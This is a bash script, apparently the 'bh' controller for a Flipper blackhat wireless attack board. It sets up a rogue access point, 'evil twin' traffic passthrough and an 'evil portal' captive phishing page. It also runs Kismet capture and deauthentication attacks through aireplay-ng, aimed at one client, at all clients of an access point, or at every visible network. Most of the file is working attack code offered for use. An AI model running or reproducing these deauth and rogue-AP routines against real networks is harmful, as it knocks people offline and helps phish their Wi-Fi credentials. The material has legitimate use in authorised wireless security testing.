#!/bin/bash
set -m

# For Debugging
# set -mxe
# x: print everything
# e: quit when anything fails

# If we're not connect to the blackpants, echo
# everything back to the screen
USB_HUB=0424:2514
blackpants=true
if ! lsusb -d "$USB_HUB" >/dev/null 2>&1; then
    exec > >(tee /dev/tty1) 2>&1
    export PYTHONUNBUFFERED=1
    blackpants=false
fi

armbian=false
if grep -qi '^ID=debian' /etc/os-release; then
    armbian=true
fi

config_f="/mnt/blackhat.conf"
if [[ -f "${config_f}" ]]; then
    log_f="/mnt/blackhat.log"
else
    echo "Could not load conf file"
    exit
fi

source "$config_f"
rm -rf $log_f 2>/dev/null

print_help() {
    echo "Commands:"
    echo "usage: bh wifi connect wlan0"
    echo "usage: bh wifi"
    echo "        bh set PASS 'my_wifi_password'"
    echo "  set"
    echo "    SSID              Set SSID of WiFi network to connect to"
    echo "    PASS              Set password for WiFi network: SSID"
    echo "    AP_SSID           Set SSID of WiFi network you're creating"
    echo "  wifi"
    echo "    list <iface>      List WiFi APs"
    echo "    con <iface|stop>  Connect/disconnect to WiFi network"
    echo "    dev               List wlan devices"
    echo "    ap <iface|stop>   Enable/disable Access Point"
    echo "    ip                Get IP Addresses"
    echo "  ssh [stop]          Enable/disable SSH daemon"
    echo "  evil_twin           Enable internet passthrough from AP to WiFi"
    echo "  evil_portal [stop]  Enable/disable evil portal the AP"
    echo "  kismet <iface|stop> Enable/disable Kismet"
    echo "  deauth <client_mac> <ap_mac> [iface]  Deauth specific client from AP"
    echo "  deauth_all <ap_mac> [iface]          Deauth all clients from AP"
    echo "  deauth_broadcast [iface]             Deauth all visible associations"
    echo "  deauth_scan [iface]                  Scan and show targets for deauth"
    echo "  test_inet           Ping google.com"
    echo "  get                 Get currently set parameters"
    echo "  script"
    echo "    scan"
    echo "    run <script>"
}

wlan_has_internet() {
    local ifc type

    # for ifc in wlan0 wlan1 wlan2; do
    for ifc in /sys/class/net/wlan*; do
        [[ -e "$ifc" ]] || continue
        ifc="${ifc##*/}"

        ip link show dev "$ifc" 2>/dev/null | grep -q "state UP" || continue
        ip -4 addr show dev "$ifc" | grep -q "inet " || continue
        ip -4 route show default dev "$ifc" | grep -q '^default ' || continue

        if ping -I "$ifc" -c 1 -W 1 1.1.1.1 >/dev/null 2>&1; then
            printf '%s\n' "$ifc"
            return 0
        fi
    done

    return 1
}

wlan_hostapd_ap_nic() {
    local ifc

    # Pull the most recent "wlanX: AP-ENABLED" from this boot
    ifc="$(
        journalctl -b -u hostapd --no-pager 2>/dev/null \
            | sed -n 's/.*\b\(wlan[0-9]\+\): AP-ENABLED.*/\1/p' \
            | tail -n 1
    )"

    [[ -n "$ifc" ]] || return 1
    printf '%s\n' "$ifc"
}

validate_wlan_nic() {
    nic=$(bh wifi dev | grep "$1" | awk '{print $1}' | grep wlan | head -n1)
    if [ "$nic" != "$1" ]; then
        echo "Invalid wlan device!"
        exit
    fi
}

connect_wifi() {
    if [ "$1" = "stop" ]; then
        killall wpa_supplicant || true
        INET_NIC=$(wlan_has_internet) || exit
        ip link set $INET_NIC down
        nmcli radio wifi off 2>/dev/null
        rm /run/inet_nic
        echo "WiFi Disconnected"
        exit
    fi

    check "$1"
    validate_wlan_nic "$1"
    INET_NIC=$1
    echo Connecting with: $INET_NIC
    ip link set $INET_NIC up

    if [[ "$armbian" == true ]]; then
        if [[ "$blackpants" == true ]]; then
            nmtui
        else
            connect_wifi_nm "$@"
        fi
    else
        connect_wifi_wpa "$@"
    fi
}

connect_wifi_nm() {
    INET_NIC=$1
    nmcli radio wifi on
    if [[ -z ${PASS:-} ]]; then
        out="$(nmcli dev wifi connect "$SSID" ifname "$INET_NIC" 2>&1)"
        rc=$?
        echo "$out" | grep -v "property is missing"
    else
        out="$(nmcli dev wifi connect "$SSID" password "$PASS" \
            ifname "$INET_NIC" 2>&1)"
        rc=$?
        echo "$out" | grep -v "property is missing"
    fi

    if [[ $rc -eq 0 ]]; then
        echo $INET_NIC Connected!
    fi
}

connect_wifi_wpa() {
    if [[ -z ${PASS:-} ]]; then
        echo "No password, connecting to open network"
        wpa_supplicant -B -i "$INET_NIC" -c <(cat <<EOF
network={
    ssid="$SSID"
    key_mgmt=NONE
}
EOF
)
    else
        echo "Password set"
        wpa_supplicant -B -i $INET_NIC -c <(wpa_passphrase "$SSID" "$PASS")
    fi
}

start_ap() {
    check "$1"
    if [ "$1" = "stop" ]; then
        AP_NIC=$(wlan_hostapd_ap_nic) || exit
        if [[ "$armbian" == true ]]; then
            systemctl stop hostapd
        else
            killall hostapd
            ip link set "$AP_NIC" down
            ip addr flush "$AP_NIC"
        fi

        echo "$AP_NIC AP Stopped"
        exit
    fi

    hostapd_conf="/etc/hostapd.conf"
    if [[ "$armbian" == true ]]; then
        hostapd_conf="/etc/hostapd/hostapd.conf"
    fi

    validate_wlan_nic "$1"
    AP_NIC=$1
    echo AP_NIC: $AP_NIC

    ip link set $AP_NIC down
    ip addr add $AP_IP/24 dev $AP_NIC

    sed -i '/^[[:space:]]*#*[[:space:]]*interface[[:space:]]*=/d' /etc/dnsmasq.conf
    echo "interface=$AP_NIC" >> /etc/dnsmasq.conf

    sed -i '/^[[:space:]]*#*[[:space:]]*ssid[[:space:]]*=/d' "$hostapd_conf"
    echo "ssid=$AP_SSID" >> "$hostapd_conf"

    sed -i '/^[[:space:]]*#*[[:space:]]*interface[[:space:]]*=/d' "$hostapd_conf"
    echo "interface=$AP_NIC" >> "$hostapd_conf"

    if [[ "$armbian" == true ]]; then
        systemctl restart hostapd
        systemctl restart dnsmasq
    else
        kill $(pidof hostapd) 2>/dev/null
        hostapd /etc/hostapd.conf -i $AP_NIC &

        kill $(pidof dnsmasq) 2>/dev/null
        dnsmasq -C /etc/dnsmasq.conf -d 2>&1 > $log_f &
    fi
}

get_5ghz_nic() {
    bh wifi dev | grep "5GHz" | awk '{print $1}' | grep wlan | head -n1
}

get_2_4ghz_nic() {
    bh wifi dev | grep -v "5GHz" | awk '{print $1}' | grep wlan | head -n1
}

evil_twin() {
    AP_NIC=$(wlan_hostapd_ap_nic) || {
        echo "Enable AP First."
        return 1
    }

    INET_NIC=$(wlan_has_internet) || {
        echo "Connect to internet first."
        return 1
    }

    echo "$AP_NIC -> AP, $INET_NIC -> Inet nic."
    echo "Starting Evil Twin"

    # Enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward

    nft delete rule ip nat postrouting oifname "$INET_NIC" masquerade 2>/dev/null
    nft delete rule ip filter forward iifname "$AP_NIC" accept 2>/dev/null

    nft add table ip nat
    nft add chain ip nat postrouting '{ type nat hook postrouting priority 100 ; }'
    nft add rule ip nat postrouting oifname "$INET_NIC" masquerade

    nft add table ip filter
    nft add chain ip filter forward '{ type nat hook postrouting priority 100 ; }'
    nft add rule ip filter forward iifname "$AP_NIC" accept
}

start_evil_portal() {
    if [[ "$1" == "stop" ]]; then
        if [[ "$armbian" == false ]]; then
            killall nginx
        else
            sudo systemctl stop nginx
        fi

        killall evil_portal
        echo "Evil Portal Stopped"
        exit
    fi

    AP_NIC=$(wlan_hostapd_ap_nic) || {
        echo "Enable AP First."
        return 1
    }

    INET_NIC=$(wlan_has_internet) || {
        echo "Connect to internet first."
        return 1
    }

    echo "$AP_NIC -> AP, $INET_NIC -> Inet nic."
    echo "Starting Evil Portal"

    echo 1 > /proc/sys/net/ipv4/ip_forward
    nft -f /etc/ep-rules.nft
    nft add rule ip nat postrouting oif $INET_NIC ip saddr @allowed_ips masquerade
    cp /mnt/index.html /var/www/

    if [[ "$armbian" == true ]]; then
        sudo systemctl restart dnsmasq
        sudo systemctl restart nginx
    else
        kill -9 $(pidof dnsmasq) 2>/dev/null
        dnsmasq -C /etc/dnsmasq.conf -d 2>&1 > $log_f &

        kill -9 $(pidof nginx) 2>/dev/null
        mkdir /var/log/nginx 2>/dev/null
        nginx &
    fi

    killall -q evil_portal
    ip link set lo up

    evil_portal &
}

set_param() {
    sed -i "/^export $1=/cexport $1=\'$2\'" "$config_f"
}

get_param() {
    grep "export $1" "$config_f" | cut -d"'" -f2
}

check() {
    if [ -z "$1" ]; then
        print_help
        exit
    fi
}

wifi() {
    subcommand="$1"; shift
    case "$subcommand" in
        list)
            check "$1"
            iw "$1" scan | grep "SSID:"
            ;;
        connect | con)
            connect_wifi "$@"
            ;;
        ap)
            start_ap "$@"
            ;;
        dev)
            s=$(iw dev | grep -e phy -e wlan)
            s=$(echo $s | sed 's/Interface//g')
            s=$(echo $s | sed 's/#//g')

            for word in $s; do
                if [[ $word == phy* ]]; then
                    phy=$word
                elif [[ $word == wlan* ]]; then
                    eval "$word=$phy"
                fi
            done

            # Manually loop through the wlanX variables
            i=0
            while true; do
                var="wlan$i"
                # Check if the variable exists by testing its value
                eval "value=\$$var"  # Dereference the variable using eval
                if [ -n "$value" ]; then
                    if iw $value info | grep -qE "5180|5200|5220|5240|5260"; then
                        echo "$var -> 2.4GHz / 5GHz"
                    else
                        echo "$var -> 2.4GHz"
                    fi
                else
                    break
                fi
                i=$((i+1))
            done
            ;;
        ip)
            ip addr | grep wlan | awk -F': <' '{print $1}' | awk -F'/24' '{print $1}'
            ;;
        *)
            print_help
    esac
}


script() {
    subcommand="$1"; shift
    case "$subcommand" in
        scan)
            ls -1 --color=never /mnt/scripts/
            ;;
        run)
            "/mnt/scripts/$1"
            ;;
        *)
            print_help
    esac
}

bh_kismet() {
    check "$1"

    if [ "$1" = "stop" ]; then
        systemctl stop kismet
        echo "Kismet Stopped"
        return 0
    fi

    validate_wlan_nic "$1"
    KISMET_NIC=$1
    echo KISMET_NIC: $KISMET_NIC

    mkdir -p /etc/systemd/system/kismet.service.d
    printf '%s\n' \
      '[Service]' \
      "Environment=KISMET_NIC=${KISMET_NIC}" \
      'ExecStart=' \
      'ExecStart=/usr/bin/kismet --no-ncurses-wrapper --source=${KISMET_NIC}' \
      > /etc/systemd/system/kismet.service.d/override.conf

    systemctl start kismet
    systemctl daemon-reload
    systemctl restart kismet
    echo "Kismet running. Port: 2501"
}

ssh() {
    if [ "$1" = "stop" ]; then
        killall dropbear
        echo "SSH Server Stopped"
        exit
    fi

    mkdir /var/run/dropbear 2>/dev/null
    /usr/sbin/dropbear -R
    echo "SSH Server Started"
    bh wifi ip
}

setup_monitor_mode() {
    local iface=$1
    echo "Setting up monitor mode on $iface..."

    # Set to monitor mode
    ip link set $iface down
    iw dev $iface set type monitor 2>/dev/null
    if [ $? -ne 0 ]; then
        echo "Failed to set monitor mode on $iface"
        return 1
    fi

    # Bring interface up
    ip link set $iface up
    echo "Monitor mode enabled on $iface"
    return 0
}

deauth_scan() {
    local iface="${1:-wlan1}"

    echo "Setting up monitor mode on $iface for scanning..."
    setup_monitor_mode $iface
    if [ $? -ne 0 ]; then
        return 1
    fi

    echo "Scanning for targets on $iface (30 seconds)..."
    echo "Press Ctrl+C to stop early"
    echo ""
    echo "TARGET NETWORKS:"
    airodump-ng $iface --write /tmp/deauth_targets --output-format csv &
    SCAN_PID=$!
    sleep 30
    kill $SCAN_PID 2>/dev/null

    echo ""
    echo "=== SCAN RESULTS ==="
    echo "Access Points (Targets for deauth_all):"
    if [ -f /tmp/deauth_targets-01.csv ]; then
        grep -v "Station MAC" /tmp/deauth_targets-01.csv | grep -v "BSSID" | head -20 | while IFS=, read bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
            if [ -n "$bssid" ] && [ "$bssid" != "BSSID" ]; then
                echo "  AP: $bssid  Channel: $channel  ESSID: $essid"
            fi
        done
        echo ""
        echo "Connected Clients (Targets for deauth):"
        grep -A 1000 "Station MAC" /tmp/deauth_targets-01.csv | grep -v "Station MAC" | head -20 | while IFS=, read station_mac first_seen last_seen power packets bssid probed_essids; do
            if [ -n "$station_mac" ] && [ -n "$bssid" ]; then
                echo "  Client: $station_mac  ->  AP: $bssid"
            fi
        done
    fi

    echo ""
    echo "Usage examples:"
    echo "  bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 $iface"
    echo "  bh deauth_all 11:22:33:44:55:66 $iface"

    rm -f /tmp/deauth_targets* 2>/dev/null
}

deauth_attack() {
    local client_mac="$1"
    local ap_mac="$2"
    local iface="${3:-wlan1}"
    local count="${4:-10}"

    if [ -z "$client_mac" ] || [ -z "$ap_mac" ]; then
        echo "Usage: bh deauth <client_mac> <ap_mac> [interface] [count]"
        echo "Example: bh deauth aa:bb:cc:dd:ee:ff 11:22:33:44:55:66 wlan1"
        echo ""
        echo "To find targets, run: bh deauth_scan [interface]"
        return 1
    fi

    echo "Deauth Attack:"
    echo "  Client: $client_mac"
    echo "  AP: $ap_mac"
    echo "  Interface: $iface"
    echo "  Count: $count"

    setup_monitor_mode $iface
    if [ $? -ne 0 ]; then
        return 1
    fi

    echo "Executing deauth attack..."
    aireplay-ng --deauth $count -a "$ap_mac" -c "$client_mac" $iface
    echo "Deauth attack completed"
}

deauth_all() {
    local ap_mac="$1"
    local iface="${2:-wlan1}"
    local count="${3:-10}"

    if [ -z "$ap_mac" ]; then
        echo "Usage: bh deauth_all <ap_mac> [interface] [count]"
        echo "Example: bh deauth_all 11:22:33:44:55:66 wlan1"
        echo ""
        echo "To find targets, run: bh deauth_scan [interface]"
        return 1
    fi

    echo "Deauth All Clients:"
    echo "  Target AP: $ap_mac"
    echo "  Interface: $iface"
    echo "  Count: $count"

    setup_monitor_mode $iface
    if [ $? -ne 0 ]; then
        return 1
    fi

    echo "Executing deauth attack against all clients..."
    aireplay-ng --deauth $count -a "$ap_mac" $iface
    echo "Deauth all attack completed"
}

deauth_broadcast() {
    local iface="${1:-wlan1}"
    local count="${2:-5}"

    echo "WARNING: Nuclear option - will deauth ALL visible associations!"
    echo "Interface: $iface"
    echo "Count: $count"
    echo ""
    echo "Press Ctrl+C within 5 seconds to cancel..."
    sleep 5

    setup_monitor_mode $iface
    if [ $? -ne 0 ]; then
        return 1
    fi

    echo "Scanning for targets..."
    rm /tmp/deauth_broadcast* 2>/dev/null
    airodump-ng $iface --write /tmp/deauth_broadcast --output-format csv > /dev/null 2>&1 &
    sleep 20
    kill $!
    echo "Scan finished"

    if [ -f /tmp/deauth_broadcast-01.csv ]; then
        echo "Executing broadcast deauth attacks..."
        grep -v "Station MAC" /tmp/deauth_broadcast-01.csv | grep -v "BSSID" | while IFS=, read bssid rest; do
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                echo "Deauthing AP: $bssid"
                iw dev wlan1 set channel 1 # Fix this later
                aireplay-ng --deauth $count -a "$bssid" $iface --ignore-negative-one
            fi
        done
        wait
        echo "Broadcast deauth completed"
    else
        echo "No targets found"
    fi

    rm -f /tmp/deauth_broadcast* 2>/dev/null
}

## Main
subcommand="$1"; shift
case "$subcommand" in
    set)
        set_param "$@"
        ;;
    get)
        get_param "$@"
        ;;
    wifi)
        wifi "$@"
        ;;
    ssh)
        ssh "$@"
        ;;
    evil_twin)
        evil_twin "$@"
        ;;
    evil_portal)
        start_evil_portal "$@"
        ;;
    kismet)
        bh_kismet "$@"
        ;;
    deauth)
        deauth_attack "$@"
        ;;
    deauth_all)
        deauth_all "$@"
        ;;
    deauth_scan)
        deauth_scan "$@"
        ;;
    deauth_broadcast)
        deauth_broadcast "$@"
        ;;
    test_inet)
        ping google.com -w 3
        ;;
    help)
        print_help
        ;;
    pull)
        scp machinehum@192.168.1.178:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.conf /mnt/
        scp machinehum@192.168.1.178:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.sh /tmp/bh
        echo "run: mv /tmp/bh /usr/bin/bh"
        ;;
    script)
        script "$@"
        ;;
    *)
        print_help
        ;;
esac
